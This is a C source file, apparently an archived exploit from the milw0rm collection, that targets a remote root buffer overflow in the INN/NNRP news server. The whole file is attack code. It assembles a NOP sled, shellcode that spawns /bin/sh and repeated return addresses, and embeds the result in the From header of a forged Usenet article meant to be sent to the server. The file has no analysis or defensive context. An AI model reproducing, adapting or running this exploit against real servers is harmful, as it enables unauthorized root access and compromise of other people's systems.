/*
 *  INND/NNRP remote root overflow
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

#define DEFAULT_OFFSET	792
#define BUFFER_SIZE	796
#define ADDRS		80
#define RET			0xefbf95e4
#define NOP			"\x08\x21\x02\x80"

int main(argc, argv)
int argc;
char **argv;
{
  char *buff = NULL, *ptr = NULL;
  u_long *addr_ptr = NULL;
  int ofs = DEFAULT_OFFSET;
  int noplen;
  int i, j;
  u_char execshell[] = 
    "\x34\x16\x05\x06\x96\xd6\x05\x34\x20\x20\x08\x01"
    "\xe4\x20\xe0\x08\x0b\x5a\x02\x9a\xe8\x3f\x1f\xfd"
    "\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02"
    "\x60\x40\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99"
    "\x0b\x18\x02\x98\x34\x16\x04\xbe\x20\x20\x08\x01"
    "\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe"
    "/bin/sh";
  
  if(argc > 1)
    ofs = atoi(argv[1]);

  if(!(buff = malloc(4096)))
  {
    (void)fprintf(stderr, "can't allocate memory\n");
    exit(1);
  }

  ptr = buff;
  noplen = BUFFER_SIZE - strlen(execshell) - ADDRS;

  for(i = 0; i < noplen / 4; i++)
  {
    for(j = 0; j < 4; j++)
      *ptr++ = NOP[j];
  }

  *ptr += noplen;

  for(i = 0; i < strlen(execshell); i++)
    *ptr++ = execshell[i];

  addr_ptr = (unsigned long *)ptr;

  for(i = 0; i < ADDRS / 4; i++)
    *addr_ptr++ = (RET - ofs);

  ptr = (char *)addr_ptr;
  *ptr = '\0';

  (void)fprintf(stderr, "shellcode len: %d, RET: %x\n", strlen(buff), RET-ofs);

  printf(
    "Path: babcia!padlina\n"
    "From: babunia @%s\n"
    "Newsgroups: pl.test\n"
    "Subject: test\n"
    "Message-ID: <830201540.9220@padlina.z-miesne.krakow.pl>\n"
    "Date: 26 Aug 1999 10:36:54 +0200\n"
    "Lines: 1\n"
    "\n"
    "west. test it.\n"
    ".\n", buff);
}


// milw0rm.com [2000-11-30]
